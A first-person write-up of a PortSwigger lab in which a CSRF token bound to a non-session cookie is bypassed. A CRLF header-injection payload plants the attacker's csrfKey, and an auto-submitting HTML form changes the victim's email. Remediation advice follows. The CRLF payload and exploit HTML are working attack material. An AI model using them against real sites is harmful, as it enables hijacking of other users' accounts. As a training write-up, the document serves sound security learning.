# Lab- CSRF where token is tied to non-session cookie

## 1. Lab Overview

The application contains a CSRF vulnerability in the email change functionality.

The application uses both:

- A `session` cookie to identify the logged-in user.
- A `csrfKey` cookie and a `csrf` parameter to protect against CSRF.

The security problem is that the CSRF token is tied to the `csrfKey` cookie, but the `csrfKey` is not strictly tied to the user's session.

This means that an attacker can obtain a valid `csrfKey` and CSRF token from their own account and use them in a request made from another user's session.

The main challenge is getting the attacker's `csrfKey` into the victim's browser.

The application has a second vulnerability in the search functionality that allows the attacker to inject a `Set-Cookie` header. This can be used to set the attacker's `csrfKey` in the victim's browser.

---

# 2. Understanding the Vulnerability

Normally, the CSRF token should be associated with the user's session.

For example:

```
Carlos session
Carlos CSRF token
```

However, in this lab, the application effectively validates the relationship between:

```
csrfKey
csrf token
```

without properly verifying that the `csrfKey` belongs to the same session.

Therefore, an attacker can use:

```
Attacker's csrfKey
Attacker's csrf token
Victim's session
```

and the server accepts the request.

This is the main vulnerability.

---

# 3. Step 1 — Log in as Wiener

I first logged into the application using the provided credentials:

```
wiener:peter
```

I then submitted the "Update email" form and inspected the request in Burp Suite Proxy history.

The request contained a structure similar to:

```
POST /my-account/change-email HTTP/2

Cookie: session=WIENER_SESSION; csrfKey=WIENER_KEY

email=test@example.com&csrf=WIENER_TOKEN
```

I saved:

```
WIENER_KEY
```

and:

```
WIENER_TOKEN
```

These values were important for the exploit.

---

# 4. Step 2 — Test Whether csrfKey Is Tied to the Session

I sent the email change request to Burp Repeater.

First, I changed the `session` cookie.

This logged me out, which showed that the session cookie was correctly tied to the authenticated user.

I then tested changing only the `csrfKey`.

The application rejected the CSRF token.

At first this suggested that the `csrfKey` might be tied to the session.

However, the next test showed that this assumption was incorrect.

---

# 5. Step 3 — Test the csrfKey Between Two Accounts

I opened another private/incognito browser window and logged into the other account.

I submitted a fresh email change request and sent it to Burp Repeater.

I then swapped the following values from the first account into the second account's request:

```
csrfKey
csrf
```

The request was accepted.

This was the key discovery.

It demonstrated that the CSRF token and `csrfKey` did not need to belong to the same session.

The application was effectively checking:

```
csrfKey
csrf token
```

instead of:

```
session
csrfKey
csrf token
```

This confirmed the CSRF vulnerability.

---

# 6. Step 4 — Find a Way to Set the csrfKey in the Victim's Browser

The remaining problem was:

I had the attacker's `csrfKey`, but I could not directly set a cookie inside the victim's browser.

I went back to the search functionality and submitted a search request.

The search term was reflected inside a `Set-Cookie` response header.

This meant that user-controlled input was being reflected into an HTTP response header.

Because of this behavior, I could inject a new cookie using CRLF injection.

---

# 7. Understanding the CRLF Payload

The basic vulnerable URL was:

```
/?search=test
```

The payload used was:

```
/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
```

The important part is:

```
%0d%0a
```

which represents CRLF.

It allows the injected value to start a new HTTP header.

The injected header becomes:

```
Set-Cookie: csrfKey=YOUR-KEY; SameSite=None
```

Therefore, when the victim visits the URL, the server response causes the victim's browser to store the attacker's `csrfKey`.

---

# 8. My First Exploit Attempt

My first exploit looked like this:

```html
<img src="<https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20>">

<form method="POST" action="<https://LAB-ID.web-security-academy.net/my-account/change-email>">
    <input type="hidden" name="email" value="attacker@example.com">
    <input type="hidden" name="csrf" value="YOUR-CSRF-TOKEN">
</form>

<script>
document.forms[0].submit();
</script>
```

This did not solve the lab.

---

# 9. Why the First Exploit Failed

There were two important issues during troubleshooting.

First, the injected cookie needed:

```
SameSite=None
```

The correct injected header was:

```
Set-Cookie: csrfKey=YOUR-KEY; SameSite=None
```

Second, the final exploit was supposed to use the `img` element's `onerror` handler rather than a separate auto-submit script.

The PortSwigger solution specifically uses:

```html
<img src="..." onerror="document.forms[0].submit()">
```

This makes the sequence happen automatically:

```
GET request
csrfKey cookie is injected
image fails to load
onerror executes
POST form is submitted
```

---

# 10. Another Problem — Gateway Timeout

During testing, I also received:

```
Server Error: Gateway Timeout (0) connecting to ...
```

This initially looked like a problem with the CSRF payload.

However, because the requests in Burp Repeater were working correctly, I determined that the vulnerability itself was not the problem.

I checked the lab connection and continued testing the exploit.

---

# 11. Final Exploit

The final exploit used was:

```html
<img src="<https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None>" onerror="document.forms[0].submit()">

<form method="POST" action="<https://LAB-ID.web-security-academy.net/my-account/change-email>">
    <input type="hidden" name="email" value="attacker123@example.com">
    <input type="hidden" name="csrf" value="YOUR-CSRF-TOKEN">
</form>
```

The email address was changed to something different from my own account's email, as required by the lab.

I stored the exploit and clicked:

**Deliver to victim**

The lab was successfully solved.

---

# 12. What Happens During the Attack

The attack can be understood as two requests.

### Request 1 — Inject the Cookie

The victim's browser loads:

```html
<img src="<https://LAB-ID.web-security-academy.net/?search=...>">
```

This causes a GET request.

The vulnerable search functionality reflects the injected value into the response:

```
Set-Cookie: csrfKey=ATTACKER-KEY; SameSite=None
```

The victim's browser stores:

```
csrfKey=ATTACKER-KEY
```

---

### Request 2 — Change the Email

The `img` fails to load, so:

```jsx
document.forms[0].submit()
```

is executed.

This submits:

```
POST /my-account/change-email
```

with:

```
email=attacker123@example.com
csrf=ATTACKER-TOKEN
```

The victim's browser automatically includes:

```
session=VICTIM-SESSION
```

and now also has:

```
csrfKey=ATTACKER-KEY
```

So the server receives:

```
Victim session
Attacker csrfKey
Attacker csrf token
```

Because the application only checks that the CSRF token corresponds to the `csrfKey`, the request is accepted.

---

# 13. Why the Attack Works

The root cause is improper binding of the CSRF token to the authenticated session.

The application should enforce:

```
Session
   |
   +-- CSRF key
          |
          +-- CSRF token
```

Instead, the vulnerable implementation effectively allows:

```
Victim session
Attacker CSRF key
Attacker CSRF token
```

As long as the CSRF token matches the supplied `csrfKey`, the request is accepted.

---

# 14. Impact

An attacker can potentially perform state-changing actions on behalf of another authenticated user.

In this lab, the vulnerable action is changing the victim's email address.

In a real application, similar CSRF vulnerabilities could affect actions such as:

- Changing account information
- Changing passwords
- Modifying security settings
- Adding payment information
- Performing administrative actions

The exact impact depends on which state-changing functionality is protected by the vulnerable CSRF mechanism.

---

# 1. Remediation

The application should properly bind CSRF tokens to the authenticated session.

A secure implementation should ensure that a token generated for one session cannot be reused in another session.

For example:

```
User session
CSRF secret
CSRF token
```

The server should validate that the submitted token belongs to the currently authenticated session.

Additional protections such as appropriate `SameSite` cookie settings can also help reduce CSRF risk, but they should not replace proper server-side CSRF validation.

The search functionality should also prevent user-controlled input from being injected into HTTP response headers.
